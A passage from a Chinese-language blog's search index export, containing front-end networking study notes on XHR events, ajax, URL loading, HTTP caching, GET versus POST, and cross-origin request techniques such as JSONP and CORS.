<li><code>event.totalSize</code> —- 表示根据 <code>Content-Length</code> 响应头部确定的预期字节数</li>
</ul>
</li>
</ul>
<h6 id="error"><a href="#error" class="headerlink" title="error"></a>error</h6><ul>
<li>描述：请求发生错误时触发</li>
</ul>
<h6 id="abort"><a href="#abort" class="headerlink" title="abort"></a>abort</h6><ul>
<li>描述：调用 <code>xhr.abort()</code> 方法终止连接时触发</li>
</ul>
<h6 id="load"><a href="#load" class="headerlink" title="load"></a>load</h6><ul>
<li>描述：响应数据接受完毕时触发</li>
<li>注意：实际上 <code>load</code> 事件是为了取代 <code>readystatechange</code> 事件而定义的，<code>load</code> 事件的好处是，我们不需要手动判断 <code>readyState</code> 属性的值。</li>
</ul>
<h6 id="loadend"><a href="#loadend" class="headerlink" title="loadend"></a>loadend</h6><ul>
<li>描述：触发 <code>error</code>、<code>abort</code>、<code>load</code> 事件后触发</li>
</ul>
<h4 id="ajax的优缺点"><a href="#ajax的优缺点" class="headerlink" title="ajax的优缺点"></a>ajax的优缺点</h4><h6 id="ajax的优点"><a href="#ajax的优点" class="headerlink" title="ajax的优点"></a>ajax的优点</h6><ul>
<li>无刷新更新数据，不影响用户交互</li>
<li>传统方式每次与服务器交互都返回整个HTML页面内容，ajax仅获取必要的数据，减少带宽</li>
<li>ajax是前后端分离能够实现的重要桥梁</li>
</ul>
<h6 id="ajax的缺点"><a href="#ajax的缺点" class="headerlink" title="ajax的缺点"></a>ajax的缺点</h6><ul>
<li>越过浏览器的历史记录，页面无法返回前一个状态</li>
<li>不利于搜索引擎优化(SEO)</li>
</ul>
]]></content>
      <categories>
        <category>网络</category>
      </categories>
      <tags>
        <tag>API</tag>
        <tag>ajax</tag>
      </tags>
  </entry>
  <entry>
    <title>网络-从输入URL到页面加载完成的过程</title>
    <url>/2018/04/17/%E7%BD%91%E7%BB%9C_%E4%BB%8E%E8%BE%93%E5%85%A5URL%E5%88%B0%E9%A1%B5%E9%9D%A2%E5%8A%A0%E8%BD%BD%E5%AE%8C%E6%88%90%E7%9A%84%E8%BF%87%E7%A8%8B/</url>
    <content><![CDATA[<h2 id="从输入URL到页面加载完成的过程中都发生了什么事情？"><a href="#从输入URL到页面加载完成的过程中都发生了什么事情？" class="headerlink" title="从输入URL到页面加载完成的过程中都发生了什么事情？"></a>从输入URL到页面加载完成的过程中都发生了什么事情？</h2><h4 id="解析URL"><a href="#解析URL" class="headerlink" title="解析URL"></a>解析URL</h4><p>当你在浏览器中输入URL并敲回车之后，浏览器会把URL分成几部分：</p>
<ul>
<li>1、协议：从计算机获取资源的方式，常见的HTTP、FTP等</li>
<li>2、网络地址：域名或者IP，指示网络中的哪一台计算机</li>
<li>3、资源路径：指示在该计算机上获取哪一个资源</li>
</ul>
<h4 id="DNS域名解析"><a href="#DNS域名解析" class="headerlink" title="DNS域名解析"></a>DNS域名解析</h4><p>当浏览器发现网络地址并不是IP，而是域名的时候，浏览器会向DNS服务器发送请求，查找域名对应的IP，如果该DNS服务器没有找到该域名对应的IP，那吗会向上级请求，直到根节点，结果只有两个：要吗找到了，要吗找不到。<br>（你电脑里的网络设置里面有DNS的服务器IP）</p>
<p>扩展：例如百度、淘宝这些访问量及其大的网站，在DNS域名解析时，在不同的区域或不同网络下解析出来的IP可能是不同的，这就涉及负载均衡的第一步：在DNS解析域名时，将你的访问分配到不同的入口，同时尽可能保证你访问的入口是在所有入口中可能较快的一个。</p>
<h4 id="确定端口"><a href="#确定端口" class="headerlink" title="确定端口"></a>确定端口</h4><p>如果网络地址中不包含端口，那么会使用协议默认的端口。HTTP协议默认端口是80，HTTPS协议默认端口是443</p>
<h4 id="发送HTTP请求"><a href="#发送HTTP请求" class="headerlink" title="发送HTTP请求"></a>发送HTTP请求</h4><p>当浏览器对域名完成一系列的解析之后，就会构建一个HTTP请求，HTTP属于应用层协议，真正的数据传输是传输层协议TCP完成的，这就涉及到TCP建立连接的“三次握手”：</p>
<ul>
<li>1、发送端发送带有 SYN 标志的数据包给接收端，并在一定的延迟时间内等待回复</li>
<li>2、接收端收到数据包后传回一个带有 SYN/ACK 标志的数据包以示确认传达信息</li>
<li>3、发送端收到信息后还会发送一个带有 ACK 标志的数据包给接收端以示握手成功，连接建立完成</li>
</ul>
<h4 id="服务器处理并响应请求"><a href="#服务器处理并响应请求" class="headerlink" title="服务器处理并响应请求"></a>服务器处理并响应请求</h4><p>服务器收到客户端发送的HTTP请求后，分析请求报文，并查找相应的请求资源，并返回响应报文。</p>
<p>响应报文中包含一个重要的信息，状态吗：</p>
<p>常见的 4 开头的状态吗一般表示请求出了问题，如 404 表示请求的资源不存在<br>3 开头的状态吗一般表示重定向，如 301表示永久重定向<br>5 开头的状态吗一般表示服务器出了问题，如 500 表示服务器出错<br>2 开头的一般代码成功，如 200</p>
<h4 id="页面渲染"><a href="#页面渲染" class="headerlink" title="页面渲染"></a>页面渲染</h4><p>请查看 <a href="/2018/04/17/性能_浏览器渲染页面的过程/">浏览器渲染页面的过程</a></p>
]]></content>
      <categories>
        <category>网络</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>网络-强缓存与协商缓存</title>
    <url>/2018/04/17/%E7%BD%91%E7%BB%9C_%E5%BC%BA%E7%BC%93%E5%AD%98%E4%B8%8E%E5%8D%8F%E5%95%86%E7%BC%93%E5%AD%98/</url>
    <content><![CDATA[<h2 id="强缓存与协商缓存"><a href="#强缓存与协商缓存" class="headerlink" title="强缓存与协商缓存"></a>强缓存与协商缓存</h2><h4 id="浏览器缓存策略"><a href="#浏览器缓存策略" class="headerlink" title="浏览器缓存策略"></a>浏览器缓存策略</h4><h5 id="请求资源时缓存的应用过程"><a href="#请求资源时缓存的应用过程" class="headerlink" title="请求资源时缓存的应用过程"></a>请求资源时缓存的应用过程</h5><ul>
<li><p>浏览器在加载资源时根据 <code>http header</code> 判断是否命中强缓存，如果命中，则直接使用缓存里的资源，不会发送请求到服务器。</p>
</li>
<li><p>如果没有命中强缓存，浏览器会发送请求到服务器，服务器根据 <code>http header</code> 判断是否命中协商缓存，如果命中则浏览器会响应这个请求，但不会反悔资源，会告诉浏览器使用缓存里的资源。</p>
</li>
<li><p>如果协商缓存也没有命中，那么正常响应请求，返回资源。</p>
</li>
</ul>
<h5 id="强缓存和协商缓存的区别与联系"><a href="#强缓存和协商缓存的区别与联系" class="headerlink" title="强缓存和协商缓存的区别与联系"></a>强缓存和协商缓存的区别与联系</h5><p>区别：命中强缓存不会发送请求到服务器，但是协商缓存需要向服务器发送请求(因为是否命中协商缓存由服务器判断)</p>
<p>共同点：都是从浏览器的缓存中获取资源</p>
<h4 id="强缓存"><a href="#强缓存" class="headerlink" title="强缓存"></a>强缓存</h4><p>开启强缓存需要 <code>http</code> 响应头中包含指定的字段：<code>Expires</code> 或 <code>Cache-Control</code>。</p>
<h5 id="Expires"><a href="#Expires" class="headerlink" title="Expires"></a>Expires</h5><h6 id="Expires-的特点"><a href="#Expires-的特点" class="headerlink" title="Expires 的特点"></a>Expires 的特点</h6><p><code>Expires</code> 是 <code>http1.0</code> 提出一个表示资源过期的 <code>respone header</code> 字段，他有以下特点：</p>
<ul>
<li>返回的是绝对时间。</li>
<li>GMT格式的字符串表示，如：<code>Thu, 31 Dec 2037 23:55:55 GMT</code></li>
</ul>
<h6 id="Expires-的原理"><a href="#Expires-的原理" class="headerlink" title="Expires 的原理"></a>Expires 的原理</h6><p><code>Expires</code> 字段的原理是：浏览器第一次请求资源的时候，服务器在 <code>respone header</code> 中添加 <code>Expires</code> 字段，浏览器将请求回来的资源以及 <code>respone header</code> 一并存到缓存中，当浏览器再次请求这个资源的时候，先从缓存中找到该资源，然后拿到上次缓存的 <code>Expires</code> 字段的值，与当前请求的时间作比较，如果发现当前请求的时间晚于上一次换粗的 <code>Expires</code> 字段的值，说明缓存失效了，重新请求资源，并更新 <code>Expires</code> 字段的值。</p>
<h6 id="Expires-存在的问题"><a href="#Expires-存在的问题" class="headerlink" title="Expires 存在的问题"></a>Expires 存在的问题</h6><p>在介绍 <code>Expires</code> 的特点时我们知道，<code>Expires</code> 字段的值代表未来的一个绝对时间，比如 <code>2018年1月1日</code>，这会有什么问题呢？其实很明显，如果我本机时间与服务器时间相差较大的时候，<code>Expires</code> 过期很容易失效了。</p>
<h5 id="Cache-Control"><a href="#Cache-Control" class="headerlink" title="Cache-Control"></a>Cache-Control</h5><h6 id="Cache-Control-的特点"><a href="#Cache-Control-的特点" class="headerlink" title="Cache-Control 的特点"></a>Cache-Control 的特点</h6><p>正因为 <code>Expires</code> 的绝对时间存在上述的问题，<code>http1.1</code> 提出了一个新的 <code>respone header</code> 即：<code>Cache-Control</code>，它具有以下特点：</p>
<ul>
<li>返回的是相对时间</li>
<li>可以通过 <code>Cache-Control</code> 字段的属性值 <code>max-age</code> 配置缓存的时间长度，单位是秒，如下：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Cache-Control:max-age=315360000</span><br></pre></td></tr></table></figure>
<h6 id="Cache-Control-的原理"><a href="#Cache-Control-的原理" class="headerlink" title="Cache-Control 的原理"></a>Cache-Control 的原理</h6><p><code>Cache-Control</code> 缓存的原理与 <code>Expires</code> 类似，区别在于过期判断：</p>
<ul>
<li><p><code>Expires</code> 是使用本机时间与服务器返回的一个绝对时间对比，这会出问题，上面也有讲过</p>
</li>
<li><p><code>Cache-Control</code> 则不同，它是使用上一次请求的时间加上设置的相对时间，计算出一个过期时间，与本次请求的时间作对比，使用的时间都是本机时间。</p>
</li>
</ul>
<h5 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h5><p><code>Expires</code> 与 <code>Cache-Control</code> 可以同时存在于 <code>respone header</code>，<code>Cache-Control</code> 的优先级高于 <code>Expires</code>。</p>
<h4 id="协商缓存"><a href="#协商缓存" class="headerlink" title="协商缓存"></a>协商缓存</h4><p>浏览器自身就可以判断是否命中强缓存，但是协商缓存是由服务器来判断的，所以当强缓存没有命中后，浏览器会发送请求到服务器，服务器根据相应的 <code>http header</code> 判断是否命中协商缓存。如果命中协商缓存，则响应头的状态码为 <code>304</code> 即未改变(Not Modified)，告诉浏览器使用缓存中的资源。</p>
<p>开启协商缓存有两种方案：</p>
<ul>
<li>请求头：<code>If-Modified-Since</code> 配合 响应头：<code>Last-Modified</code></li>
<li>请求头：<code>If-None-Match</code> 配合 响应头：<code>ETag</code></li>
</ul>
<h5 id="Last-Modified-If-Modified-Since"><a href="#Last-Modified-If-Modified-Since" class="headerlink" title="Last-Modified / If-Modified-Since"></a>Last-Modified / If-Modified-Since</h5><h6 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h6><ul>
<li><p>当浏览器第一次向服务器请求资源时，服务器在响应头中会添加 <code>Last-Modified</code> 字段，该字段的值代表资源的最后一次修改时间。</p>
</li>
<li><p>浏览器再向服务器发送请求时，会在请求头部添加字段：<code>If-Modified-Since</code>，该字段的值为之前缓存下来的 <code>Last-Modified</code> 的值。</p>
</li>
<li><p>服务器拿到 <code>If-Modified-Since</code> 的值进行对比，如果一致则命中协商缓存，返回 <code>304</code> 状态码，告诉浏览器从缓存中获取资源。</p>
</li>
<li><p>如果没有命中协商缓存，则正常返回资源，以及新的 <code>Last-Modified</code> 值，浏览器进行更新。</p>
</li>
</ul>
<p>注意：在命中协商缓存的情况下，服务器不会在响应头中添加：<code>Last-Modified</code> 字段，因为没有必要。</p>
<h6 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h6><p>有的时候会出现这种情况：资源实际已经被修改了，但是他的最后修改时间没有变，这就会导致新的资源无法得到更新</p>
<h5 id="ETag-If-None-Match"><a href="#ETag-If-None-Match" class="headerlink" title="ETag / If-None-Match"></a>ETag / If-None-Match</h5><p>正如 <code>Last-Modified / If-Modified-Since</code> 的缺点所描述的那样，为了避免这个问题，就有了 <code>ETag / If-None-Match</code>。</p>
<h6 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h6><p>原理类似于 <code>Last-Modified / If-Modified-Since</code>，不同的时候，<code>ETag</code> 不是资源的最后修改时间，而是服务器根据当前请求的资源生成的唯一标示，是一个字符串。</p>
<h5 id="Last-Modified-与-ETag-的对比"><a href="#Last-Modified-与-ETag-的对比" class="headerlink" title="Last-Modified 与 ETag 的对比"></a>Last-Modified 与 ETag 的对比</h5><h6 id="字段值"><a href="#字段值" class="headerlink" title="字段值"></a>字段值</h6><ul>
<li><code>Last-Modified</code> 是资源的最后修改时间</li>
<li><code>ETag</code> 是当前请求的资源的唯一标示字符串</li>
</ul>
<h6 id="命中缓存后是否最为响应头返回"><a href="#命中缓存后是否最为响应头返回" class="headerlink" title="命中缓存后是否最为响应头返回"></a>命中缓存后是否最为响应头返回</h6><ul>
<li>如果命中协商缓存，<code>Last-Modified</code> 并不会最为响应头返回，因为没有必要</li>
<li>如果命中协商缓存，<code>ETag</code> 仍然会作为响应头返回，因为不管资源有没有改变，资源的唯一标示又重新生成了。</li>
</ul>
<h4 id="如何利用缓存（待续…）"><a href="#如何利用缓存（待续…）" class="headerlink" title="如何利用缓存（待续…）"></a>如何利用缓存（待续…）</h4>]]></content>
      <categories>
        <category>网络</category>
      </categories>
      <tags>
        <tag>缓存</tag>
      </tags>
  </entry>
  <entry>
    <title>网络-get和post的区别</title>
    <url>/2018/04/17/%E7%BD%91%E7%BB%9C_get%E5%92%8Cpost%E7%9A%84%E5%8C%BA%E5%88%AB/</url>
    <content><![CDATA[<h2 id="get-请求和-post-请求的区别"><a href="#get-请求和-post-请求的区别" class="headerlink" title="get 请求和 post 请求的区别"></a>get 请求和 post 请求的区别</h2><h4 id="传递数据的方式"><a href="#传递数据的方式" class="headerlink" title="传递数据的方式"></a>传递数据的方式</h4><p>get 通过 URL 或 cookie 传参</p>
<p>post 将数据放到请求体(BODY) 中</p>
<h4 id="传递数据的大小"><a href="#传递数据的大小" class="headerlink" title="传递数据的大小"></a>传递数据的大小</h4><p>get 的URL长度有限制</p>
<p>post 则可以传递大量的数据</p>
<h4 id="安全性"><a href="#安全性" class="headerlink" title="安全性"></a>安全性</h4><p>get 传递的参数会暴露在 URL 中</p>
<p>post 则不会</p>
<p>另外注意 GET 请求的参数会保存在浏览器的历史记录中</p>
]]></content>
      <categories>
        <category>网络</category>
      </categories>
      <tags>
        <tag>API</tag>
        <tag>get</tag>
        <tag>post</tag>
      </tags>
  </entry>
  <entry>
    <title>网络-跨域与跨域的解决方案</title>
    <url>/2018/04/17/%E7%BD%91%E7%BB%9C_%E8%B7%A8%E5%9F%9F%E4%B8%8E%E8%B7%A8%E5%9F%9F%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</url>
    <content><![CDATA[<h2 id="跨域"><a href="#跨域" class="headerlink" title="跨域"></a>跨域</h2><h4 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h4><h6 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h6><p>同源策略指三个相同：协议相同、域名相同、端口相同，有一个不同即非同源。</p>
<p class="tip">主域与子域、域名与域名对应的IP。都是非同源的</p>

<h6 id="意义"><a href="#意义" class="headerlink" title="意义"></a>意义</h6><p>同源策略可以算是web安全的基石，没有同源策略就么有安全可言。</p>
<h6 id="非同源的限制"><a href="#非同源的限制" class="headerlink" title="非同源的限制"></a>非同源的限制</h6><ul>
<li>无法共享 cookie/Storage/indexDB</li>
<li>无法操作彼此的 DOM</li>
<li>无法发送 ajax 请求</li>
<li>无法通过 flash 发送 http 请求</li>
</ul>
<h4 id="跨域请求的方法"><a href="#跨域请求的方法" class="headerlink" title="跨域请求的方法"></a>跨域请求的方法</h4><h6 id="JSONP"><a href="#JSONP" class="headerlink" title="JSONP"></a>JSONP</h6><ul>
<li><p>原理：JSONP 的原理是利用 <code>&lt;script&gt;</code> 标签的 <code>src</code> 属性加载资源不受同源策略影响，其本质是向服务端请求一段 <code>js</code> 代码。</p>
</li>
<li><p>实现：</p>
</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> scriptTag = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>)</span><br><span class="line"><span class="comment">// 其中cb是回调函数参数的名字，cbname是回调函数的名字，这两个名字要与服务端沟通定义</span></span><br><span class="line">scriptTag.src = <span class="string">'http://hcysun.me/xxx?cb=cbname'</span></span><br><span class="line"><span class="built_in">document</span>.body.appendChild(scriptTag)</span><br></pre></td></tr></table></figure>
<ul>
<li><p>优点</p>
<ul>
<li>1、可跨域</li>
<li>2、兼容性好，基本全部兼容</li>
</ul>
</li>
<li><p>缺点</p>
<ul>
<li>只支持 <code>GET</code> 请求</li>
<li>确定JSONP请求是否失败并不容易，一般根据超时时间来判断</li>
</ul>
</li>
</ul>
<h6 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h6><p>全称是：Cross-Origin Resource Sharing（跨域资源共享）</p>
<ul>
<li><p>原理：</p>
<ul>
<li>1、当浏览器发现我们的XHR请求不符合同源策略时，会在请求头添加 <code>Origin</code> 字段，代表请求的来源</li>
<li>2、服务端需要处理请求头部的 <code>Origin</code> 字段，根据情况在响应头中添加<ul>
<li><code>Access-Control-Allow-Origin</code></li>
<li><code>Access-Control-Allow-Methods</code></li>
<li><code>Access-Control-Allow-Headers</code><br>等头部信息</li>
</ul>
</li>
</ul>
</li>
<li><p>缺点</p>
<ul>
<li>兼容性问题，他是现代浏览器支持的一种跨域资源请求的一种方式</li>
</ul>
</li>
</ul>
<h4 id="iframe中跨域请求的方法"><a href="#iframe中跨域请求的方法" class="headerlink" title="iframe中跨域请求的方法"></a>iframe中跨域请求的方法</h4><h6 id="跨文档通信API（postMessage）"><a href="#跨文档通信API（postMessage）" class="headerlink" title="跨文档通信API（postMessage）"></a>跨文档通信API（postMessage）</h6><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Page Foo</span></span><br><span class="line">iframe.contentWindow.postMessage(<span class="string">'Hello from foo'</span>, <span class="string">'/path/to/bar'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Page Bar</span></span><br><span class="line"><span class="built_in">window</span>.parent.addEventListener(<span class="string">'message'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(e.source)    <span class="comment">// 发送消息的窗口</span></span><br><span class="line">    <span class="built_in">console</span>.log(e.origin)  <span class="comment">// 消息发向的网址</span></span><br><span class="line">    <span class="built_in">console</span>.log(e.data)    <span class="comment">// 消息内容</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<h6 id="片段标识符（hash值）"><a href="#片段标识符（hash值）" class="headerlink" title="片段标识符（hash值）"></a>片段标识符（hash值）</h6><p>父级页面虽然不能操作 <code>iframe</code> 的 <code>window</code> 和 DOM，但是可以修改 <code>iframe</code> 的 <code>URL</code>，通过修改 <code>hash</code> 值（即：<code>location.hash</code>），监听 <code>hashchange</code> 事件进行跨文档通信</p>
<h6 id="window-name"><a href="#window-name" class="headerlink" title="window.name"></a>window.name</h6>]]></content>
      <categories>
        <category>网络</category>
      </categories>
      <tags>
        <tag>跨域</tag>
      </tags>
  </entry>
</search>
